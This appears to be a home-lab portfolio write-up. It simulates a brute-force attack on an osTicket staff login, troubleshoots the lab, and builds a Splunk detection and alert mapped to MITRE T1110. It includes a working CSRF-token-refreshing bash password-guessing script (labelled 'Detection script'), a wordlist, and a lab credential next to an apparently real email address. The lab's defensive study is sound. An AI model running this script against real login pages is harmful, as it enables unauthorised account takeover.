# SOC Intake & Triage System — Stage 2: Brute-Force Simulation & Detection

**Project:** Help Desk Ticketing System (osTicket) — Project 4 of 5, SOC portfolio expansion
**Stage:** 2 of 2 — Attack simulation, detection engineering, alert deployment
**Environment:** helpdesk-01 (osTicket + MariaDB, Docker Compose, 192.168.208.50) → splunk-siem-01 (192.168.208.40) via Universal Forwarder | Attacker: Kali (192.168.208.30)
**MITRE ATT&CK:** T1110 — Brute Force (T1110.001 — Password Guessing)

## Objective

Simulate a credential brute-force attack against osTicket's staff control panel login (`/scp/login.php`), validate that the attempt volume/pattern reaches Splunk via the existing `helpdesk` index pipeline built in Stage 1, and build a saved detection alert mapped to MITRE T1110.

## Summary of outcome

- Confirmed osTicket's staff login form uses a **session-bound, single-use CSRF token**, which made a stock Hydra `http-post-form` attack unreliable (a static token is only valid for the first submitted request).
- Built a small **bash wrapper script** that fetches a fresh CSRF token and session cookie before every password attempt, giving each guess a genuinely valid request rather than a token-starved dummy one.
- Diagnosed and resolved three unrelated infrastructure issues encountered along the way (VirtualBox NIC driver hang, a bash quoting bug that corrupted a bcrypt hash mid-database-update, and a wrong staff username assumption) before the actual attack traffic could be generated cleanly.
- Verified the 8-attempt brute-force run landed in Splunk's `helpdesk` index with correct method, URI, and status fields.
- Built and saved a detection search (`≥5 POSTs to /scp/login.php from one source IP within 1 minute`), validated it against the real captured burst, and configured it as a scheduled Splunk alert.

## Attack setup

**Target form fields** (confirmed via `curl` + `grep` against the raw login page HTML):

| Field | Value |
|---|---|
| Endpoint | `POST /scp/login.php` |
| Username field | `userid` |
| Password field | `passwd` |
| Hidden CSRF field | `__CSRFToken__` |
| Hidden mode field | `do=scplogin` |
| Failure indicator | `"Access denied"` string in response body |

**Wordlist** (8 entries, correct credential mixed in near the top, mirroring the earlier SSH brute-force scenario's structure):

```
049977
password123
admin2024
marshel1
Welcome1!
changeme
summer2026
qwerty123
```

## Troubleshooting encountered

### 1. VirtualBox e1000 NIC "Tx Unit Hang"
Mid-session, helpdesk-01 became unreachable from Kali (`No route to host`, 100% ping loss). The VM's own console showed a repeating `e1000 ... Detected Tx Unit Hang` error — a known VirtualBox bug where the emulated Intel e1000 driver's transmit queue locks up under load. Resolved with a VM reboot; flagged for a longer-term fix (disabling hardware offloading via `ethtool`, or switching the adapter to paravirtualized/virtio-net) before any future sustained-load testing.

![NIC Tx Unit Hang error on helpdesk-01's console](screenshots/00-nic-tx-hang-error.png)

### 2. Session-bound, single-use CSRF token
Initial manual `curl` tests against the login form produced inconsistent results (empty bodies, unexpected redirects) until the CSRF token's behavior was isolated: the same token value was returned across two page loads *within the same session*, confirming it's tied to the `OSTSESSID` cookie rather than rotating per-request — but it is consumed after one POST, valid or not.

![Same CSRF token returned twice within one session, confirming session-binding](screenshots/00b-csrf-token-session-bound.png)

This ruled out a stock Hydra run (which reuses one static token for every attempt in a wordlist) and led to writing a custom script that re-fetches a token before each guess instead.

### 3. Bash quoting bug silently corrupted a database write
While resetting the `marshel` staff account's password directly in MariaDB (after repeated "Access denied" results couldn't be explained by username or token issues), a bcrypt hash beginning with `$2y$12$...` was passed inside **double quotes** on the command line. Bash interpreted `$2`, `$1`, and the rest as positional-parameter/variable expansions (all empty), silently collapsing the hash down to the two leftover literal characters, `y2`. The `UPDATE` succeeded without any SQL error, but the stored password hash was garbage. Root-caused by re-selecting the row and noticing the truncated value; fixed by assigning the hash to a single-quoted shell variable first, then referencing it — which prevents bash from re-parsing the `$` characters.

### 4. Wrong assumed username
Multiple failed login attempts were traced back to a false assumption: the login form's `userid` field expects osTicket's **staff email address**, not the display name `marshel`. Querying `ost_staff` directly (`SELECT username, email FROM ost_staff`) showed the actual `username` column holds an internal generated string, and the real login credential is the account's email address. All subsequent test and attack traffic used the corrected identifier.

### 5. Apparent temporary account lockout
An initial full run of the attack script returned `[FAIL]` on every password, including the one just confirmed correct seconds earlier. No lockout event appeared in osTicket's `ost_syslog` table, but the timing was consistent with an in-memory (non-logged) failed-login throttle triggered by the volume of manual testing that preceded the run. Worked around by reordering the wordlist so the correct password was attempted first, before repeated failures could accumulate.

## Detection script

```bash
#!/bin/bash
TARGET="http://192.168.208.50:8080/scp/login.php"
USERNAME="marshalmburu2@gmail.com"
WORDLIST="/tmp/wordlist.txt"

while IFS= read -r PASS; do
  COOKIEJAR=$(mktemp)
  curl -sc "$COOKIEJAR" "$TARGET" -o /tmp/_fetch.html
  TOKEN=$(grep -o '__CSRFToken__" value="[^"]*"' /tmp/_fetch.html | cut -d'"' -f3)

  RESULT=$(curl -s -b "$COOKIEJAR" \
    --data-urlencode "userid=${USERNAME}" \
    --data-urlencode "passwd=${PASS}" \
    --data-urlencode "__CSRFToken__=${TOKEN}" \
    --data-urlencode "do=scplogin" \
    "$TARGET")

  if echo "$RESULT" | grep -q "Access denied"; then
    echo "[FAIL] $PASS"
  else
    echo "[SUCCESS] $PASS"
  fi

  rm -f "$COOKIEJAR"
  sleep 1
done < "$WORDLIST"
```

**Result of final run:**

```
[SUCCESS] 049977
[FAIL] password123
[FAIL] admin2024
[FAIL] marshel1
[FAIL] Welcome1!
[FAIL] changeme
[FAIL] summer2026
[FAIL] qwerty123
```

## Validation in Splunk

The 8-attempt run appears in the `helpdesk` index as 8 POST events, all status 200, clustered within a 13-second window (09:15:32–09:15:45) — a clear, tightly-packed burst distinguishable from the earlier manual debugging traffic.

![8 POST events to /scp/login.php clustered within 13 seconds](screenshots/01-hydra-post-events-splunk.png)

## Detection logic

```spl
index=helpdesk sourcetype=access_combined "/scp/login.php" method=POST
| bucket _time span=1m
| stats count by _time, clientip
| where count >= 5
```

Run against 24 hours of data, this correctly isolated two qualifying bursts — the 09:15 attack run (8 events) and a smaller 09:08 cluster picked up from manual testing (7 events) — confirming the threshold logic catches real burst patterns, not just the clean final test.

![Detection search results: two 1-minute windows exceeding the 5-POST threshold](screenshots/02-detection-search-results.png)

## Saved alert

**Name:** `osTicket Staff Login - Brute Force Threshold`
**Description:** Detects ≥5 POST attempts to `/scp/login.php` from a single source IP within 1 minute
**Trigger condition:** Number of results > 0

The alert was initially saved with a default schedule of **weekly, Monday at 6:00** — a misconfiguration that would have left it effectively inert for live monitoring. Caught before moving on, and corrected to a 5-minute cron schedule (`*/5 * * * *`) to match the cadence of the project's other three saved alerts (SSH brute-force, Nikto/web-scanner recon, Shellshock).

![Alert saved with incorrect weekly schedule — caught before deployment](screenshots/03-alert-saved-weekly-misconfig.png)

![Alert schedule corrected to a 5-minute cron interval](screenshots/04-alert-schedule-fixed.png)

**MITRE ATT&CK mapping:** T1110.001 — Brute Force: Password Guessing

## Next steps (Stage 3)

- **Resilience test:** restart the Universal Forwarder on helpdesk-01 mid-attack (or immediately after), then generate a fresh brute-force burst and confirm the saved alert still fires despite the forwarder gap — testing detection continuity through a real-world infrastructure hiccup, not just pipeline health under ideal conditions.
- Confirm the alert produces a "fired event" entry in Splunk (none recorded yet, since the schedule was only corrected at the end of this session).